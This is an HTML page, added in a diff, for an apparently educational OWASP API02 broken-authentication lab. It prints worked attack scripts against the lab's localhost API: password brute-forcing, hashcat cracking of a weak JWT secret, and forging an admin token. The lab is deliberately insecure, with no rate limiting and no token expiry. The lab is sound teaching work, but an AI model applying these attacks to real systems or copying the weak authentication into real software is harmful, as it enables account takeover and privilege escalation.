@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>API02 Broken Authentication Lab</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 20px;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            background: white;
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        
+        .header h1 {
+            color: #dc3545;
+            margin-bottom: 10px;
+        }
+        
+        .header .subtitle {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .vulnerabilities {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin-top: 15px;
+            border-radius: 5px;
+        }
+        
+        .vulnerabilities h3 {
+            color: #856404;
+            margin-bottom: 10px;
+        }
+        
+        .vulnerabilities ul {
+            list-style: none;
+            padding-left: 0;
+        }
+        
+        .vulnerabilities li {
+            padding: 5px 0;
+            color: #856404;
+        }
+        
+        .vulnerabilities li:before {
+            content: "🔴 ";
+        }
+        
+        .panel {
+            background: white;
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 20px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        
+        .panel h2 {
+            color: #333;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #667eea;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+            font-weight: 500;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        
+        .btn {
+            background: #667eea;
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            transition: background 0.3s;
+        }
+        
+        .btn:hover {
+            background: #5568d3;
+        }
+        
+        .btn-danger {
+            background: #dc3545;
+        }
+        
+        .btn-danger:hover {
+            background: #c82333;
+        }
+        
+        .btn-success {
+            background: #28a745;
+        }
+        
+        .btn-success:hover {
+            background: #218838;
+        }
+        
+        .response-box {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .token-display {
+            background: #e7f3ff;
+            border: 1px solid #0066cc;
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 15px;
+            word-break: break-all;
+        }
+        
+        .token-display strong {
+            color: #0066cc;
+        }
+        
+        .user-info {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 15px;
+        }
+        
+        .user-info h3 {
+            color: #155724;
+            margin-bottom: 10px;
+        }
+        
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        
+        @media (max-width: 768px) {
+            .grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .error {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+        
+        .success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+        
+        pre {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔓 API02: Broken Authentication Lab</h1>
+            <p class="subtitle">OWASP API Security Top 10 - Educational Lab</p>
+            
+            <div class="vulnerabilities">
+                <h3>Demonstrated Vulnerabilities:</h3>
+                <ul>
+                    <li>No rate limiting (unlimited brute force attempts)</li>
+                    <li>Weak JWT secret 'secret123' (easily crackable)</li>
+                    <li>No token expiration (tokens valid forever)</li>
+                    <li>Weak password policy (any password accepted)</li>
+                </ul>
+            </div>
+        </div>
+        
+        <div class="grid">
+            <div>
+                <div class="panel">
+                    <h2>Login</h2>
+                    <div class="form-group">
+                        <label>Email</label>
+                        <input type="email" id="loginEmail" placeholder="alice@example.com">
+                    </div>
+                    <div class="form-group">
+                        <label>Password</label>
+                        <input type="password" id="loginPassword" placeholder="password123">
+                    </div>
+                    <button class="btn" onclick="login()">Login</button>
+                    <button class="btn btn-danger" onclick="logout()">Logout</button>
+                    
+                    <div id="loginResponse"></div>
+                </div>
+                
+                <div class="panel">
+                    <h2>Register New User</h2>
+                    <div class="form-group">
+                        <label>Username</label>
+                        <input type="text" id="regUsername" placeholder="john">
+                    </div>
+                    <div class="form-group">
+                        <label>Email</label>
+                        <input type="email" id="regEmail" placeholder="john@example.com">
+                    </div>
+                    <div class="form-group">
+                        <label>Password</label>
+                        <input type="password" id="regPassword" placeholder="Try weak password like '123'">
+                    </div>
+                    <div class="form-group">
+                        <label>Full Name</label>
+                        <input type="text" id="regFullName" placeholder="John Doe">
+                    </div>
+                    <button class="btn btn-success" onclick="register()">Register</button>
+                    
+                    <div id="registerResponse"></div>
+                </div>
+            </div>
+            
+            <div>
+                <div class="panel">
+                    <h2>Test Authentication</h2>
+                    
+                    <button class="btn" onclick="getMe()">Get My Info</button>
+                    <button class="btn" onclick="getSensitiveData()">Get Sensitive Data</button>
+                    <button class="btn btn-danger" onclick="getAdminUsers()">Admin: List Users</button>
+                    
+                    <div id="testResponse"></div>
+                </div>
+                
+                <div class="panel">
+                    <h2>Current Session</h2>
+                    <div id="sessionInfo">
+                        <p>Not logged in</p>
+                    </div>
+                </div>
+                
+                <div class="panel">
+                    <h2>Attack Examples</h2>
+                    <p style="margin-bottom: 15px;">Try these attacks in the lab:</p>
+                    <button class="btn" onclick="showBruteForceExample()">Brute Force Attack</button>
+                    <button class="btn" onclick="showJWTCrackExample()">JWT Secret Cracking</button>
+                    <button class="btn" onclick="showWeakPasswordExample()">Weak Password Registration</button>
+                    <button class="btn btn-danger" onclick="showTokenForgeExample()">Forge Admin Token</button>
+                    
+                    <div id="attackExample"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        let currentToken = null;
+        let currentUser = null;
+        
+        async function login() {
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+            
+            try {
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({email, password})
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok) {
+                    currentToken = data.access_token;
+                    currentUser = data.user;
+                    
+                    document.getElementById('loginResponse').innerHTML = `
+                        <div class="success">Login successful!</div>
+                        <div class="token-display">
+                            <strong>Access Token:</strong><br>
+                            ${currentToken}
+                        </div>
+                    `;
+                    
+                    updateSessionInfo();
+                } else {
+                    document.getElementById('loginResponse').innerHTML = `
+                        <div class="error">${data.error}</div>
+                    `;
+                }
+            } catch (error) {
+                document.getElementById('loginResponse').innerHTML = `
+                    <div class="error">Error: ${error.message}</div>
+                `;
+            }
+        }
+        
+        async function register() {
+            const username = document.getElementById('regUsername').value;
+            const email = document.getElementById('regEmail').value;
+            const password = document.getElementById('regPassword').value;
+            const full_name = document.getElementById('regFullName').value;
+            
+            try {
+                const response = await fetch('/api/register', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({username, email, password, full_name})
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok) {
+                    document.getElementById('registerResponse').innerHTML = `
+                        <div class="success">
+                            Registration successful! User ID: ${data.user_id}<br>
+                            <strong>Note:</strong> Password "${password}" was accepted (${password.length} chars)
+                        </div>
+                    `;
+                } else {
+                    document.getElementById('registerResponse').innerHTML = `
+                        <div class="error">${data.error}</div>
+                    `;
+                }
+            } catch (error) {
+                document.getElementById('registerResponse').innerHTML = `
+                    <div class="error">Error: ${error.message}</div>
+                `;
+            }
+        }
+        
+        function logout() {
+            currentToken = null;
+            currentUser = null;
+            document.getElementById('loginResponse').innerHTML = '<div class="success">Logged out (but token still valid if stolen!)</div>';
+            updateSessionInfo();
+        }
+        
+        async function getMe() {
+            if (!currentToken) {
+                document.getElementById('testResponse').innerHTML = '<div class="error">Please login first</div>';
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/me', {
+                    headers: {'Authorization': `Bearer ${currentToken}`}
+                });
+                
+                const data = await response.json();
+                
+                document.getElementById('testResponse').innerHTML = `
+                    <div class="response-box">
+                        <strong>GET /api/me</strong><br>
+                        <pre>${JSON.stringify(data, null, 2)}</pre>
+                    </div>
+                `;
+            } catch (error) {
+                document.getElementById('testResponse').innerHTML = `<div class="error">${error.message}</div>`;
+            }
+        }
+        
+        async function getSensitiveData() {
+            if (!currentToken) {
+                document.getElementById('testResponse').innerHTML = '<div class="error">Please login first</div>';
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/sensitive-data', {
+                    headers: {'Authorization': `Bearer ${currentToken}`}
+                });
+                
+                const data = await response.json();
+                
+                document.getElementById('testResponse').innerHTML = `
+                    <div class="response-box">
+                        <strong>GET /api/sensitive-data</strong><br>
+                        <pre>${JSON.stringify(data, null, 2)}</pre>
+                    </div>
+                `;
+            } catch (error) {
+                document.getElementById('testResponse').innerHTML = `<div class="error">${error.message}</div>`;
+            }
+        }
+        
+        async function getAdminUsers() {
+            if (!currentToken) {
+                document.getElementById('testResponse').innerHTML = '<div class="error">Please login first</div>';
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/admin/users', {
+                    headers: {'Authorization': `Bearer ${currentToken}`}
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok) {
+                    document.getElementById('testResponse').innerHTML = `
+                        <div class="response-box">
+                            <strong>GET /api/admin/users</strong><br>
+                            <pre>${JSON.stringify(data, null, 2)}</pre>
+                        </div>
+                    `;
+                } else {
+                    document.getElementById('testResponse').innerHTML = `
+                        <div class="error">${data.error}</div>
+                        <p style="margin-top: 10px; color: #666;">
+                            Try forging a token with "role": "admin" to bypass this check!
+                        </p>
+                    `;
+                }
+            } catch (error) {
+                document.getElementById('testResponse').innerHTML = `<div class="error">${error.message}</div>`;
+            }
+        }
+        
+        function updateSessionInfo() {
+            if (currentUser && currentToken) {
+                document.getElementById('sessionInfo').innerHTML = `
+                    <div class="user-info">
+                        <h3>Logged in as ${currentUser.username}</h3>
+                        <p><strong>Email:</strong> ${currentUser.email}</p>
+                        <p><strong>Role:</strong> ${currentUser.role}</p>
+                        <p><strong>User ID:</strong> ${currentUser.id}</p>
+                        <p style="margin-top: 10px; font-size: 12px; color: #856404;">
+                            ⚠️ Token has NO expiration!
+                        </p>
+                    </div>
+                `;
+            } else {
+                document.getElementById('sessionInfo').innerHTML = '<p>Not logged in</p>';
+            }
+        }
+        
+        function showBruteForceExample() {
+            document.getElementById('attackExample').innerHTML = `
+                <div class="response-box" style="margin-top: 15px;">
+                    <strong>Brute Force Attack Example:</strong>
+                    <pre>
+# Try unlimited passwords (no rate limiting!)
+import requests
+
+url = "http://localhost:5000/api/login"
+passwords = ["123456", "password", "admin", "letmein", "qwerty"]
+
+for pwd in passwords:
+    response = requests.post(url, json={
+        "email": "alice@example.com",
+        "password": pwd
+    })
+    
+    if response.status_code == 200:
+        print(f"✓ Password found: {pwd}")
+        print(f"Token: {response.json()['access_token']}")
+        break
+    else:
+        print(f"✗ Failed: {pwd}")
+
+# No rate limiting = All attempts processed!
+                    </pre>
+                </div>
+            `;
+        }
+        
+        function showJWTCrackExample() {
+            document.getElementById('attackExample').innerHTML = `
+                <div class="response-box" style="margin-top: 15px;">
+                    <strong>JWT Secret Cracking Example:</strong>
+                    <pre>
+# Crack the weak JWT secret using hashcat
+
+# 1. Get a valid JWT token
+token="eyJ..."  # From login response
+
+# 2. Save to file
+echo $token > jwt.txt
+
+# 3. Crack the secret (takes seconds!)
+hashcat -m 16500 jwt.txt wordlist.txt
+
+# Result: Secret is "secret123"
+
+# 4. Forge token with Python
+import jwt
+
+forged_token = jwt.encode(
+    {
+        'user_id': 1,
+        'username': 'alice',
+        'email': 'alice@example.com',
+        'role': 'admin'  # ← Escalate to admin!
+    },
+    'secret123',  # Cracked secret
+    algorithm='HS256'
+)
+
+# Use forged token to access admin endpoints!
+                    </pre>
+                </div>
+            `;
+        }
+        
+        function showWeakPasswordExample() {
+            document.getElementById('attackExample').innerHTML = `
+                <div class="response-box" style="margin-top: 15px;">
+                    <strong>Weak Password Registration:</strong>
+                    <pre>
+# Register with extremely weak passwords
+# All of these are ACCEPTED (no validation!)
+
+curl -X POST http://localhost:5000/api/register \\
+  -H "Content-Type: application/json" \\
+  -d '{
+    "username": "test1",
+    "email": "test1@example.com",
+    "password": "123"  ← Only 3 characters!
+  }'
+
+curl -X POST http://localhost:5000/api/register \\
+  -H "Content-Type: application/json" \\
+  -d '{
+    "username": "test2",
+    "email": "test2@example.com",
+    "password": "password"  ← Common password!
+  }'
+
+# No password complexity requirements!
+# No minimum length!
+# No breach checking!
+                    </pre>
+                </div>
+            `;
+        }
+        
+        function showTokenForgeExample() {
+            document.getElementById('attackExample').innerHTML = `
+                <div class="response-box" style="margin-top: 15px;">
+                    <strong>Forge Admin Token:</strong>
+                    <pre>
+# After cracking the secret, forge an admin token
+
+import jwt
+
+# Create admin token
+admin_token = jwt.encode(
+    {
+        'user_id': 999,
+        'username': 'hacker',
+        'email': 'hacker@evil.com',
+        'role': 'admin'  # ← Set admin role
+    },
+    'secret123',  # Known weak secret
+    algorithm='HS256'
+)
+
+# Use token to access admin endpoints
+import requests
+
+response = requests.get(
+    'http://localhost:5000/api/admin/users',
+    headers={'Authorization': f'Bearer {admin_token}'}
+)
+
+print(response.json())  # ✓ Access granted!
+
+# Complete authentication bypass!
+                    </pre>
+                </div>
+            `;
+        }
+        
+        // Pre-fill login form
+        document.getElementById('loginEmail').value = 'alice@example.com';
+        document.getElementById('loginPassword').value = 'password123';
+    </script>
+</body>
+</html>
